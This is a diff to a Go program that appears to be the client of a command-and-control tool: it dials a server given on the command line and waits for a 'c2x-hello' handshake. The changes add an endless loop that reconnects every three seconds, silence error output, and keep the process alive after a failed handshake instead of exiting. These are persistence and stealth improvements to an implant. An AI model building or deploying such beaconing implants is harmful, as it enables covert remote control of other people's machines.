@@ -7,6 +7,7 @@ import (
 	"os/exec"
 	"regexp"
 	"strings"
+	"time"
 
 	"github.com/akamensky/argparse"
 	"github.com/matishsiao/goInfo"
@@ -38,7 +39,10 @@ func main(){
 
 	ip_and_port := *ip_arg + ":" + *port_arg
 
-	connectToServer(ip_and_port)
+	for true {
+		connectToServer(ip_and_port)
+		time.Sleep(3 * time.Second)
+	}
 
 }
 
@@ -47,7 +51,7 @@ func connectToServer(ip_and_port string){
 	// function for connecting to server
 	c, err := net.Dial("tcp", ip_and_port)
 	if err != nil {
-		println(err.Error())
+		//println(err.Error())
 		return
 	}
 	clientSocket = c
@@ -79,7 +83,7 @@ func commandInterpreter(reply string){
 		} else {
 			clientSocket.Close()
 			// Connection closed! (haven't received c2x-hello)
-			os.Exit(1)
+			return
 
 		}
 
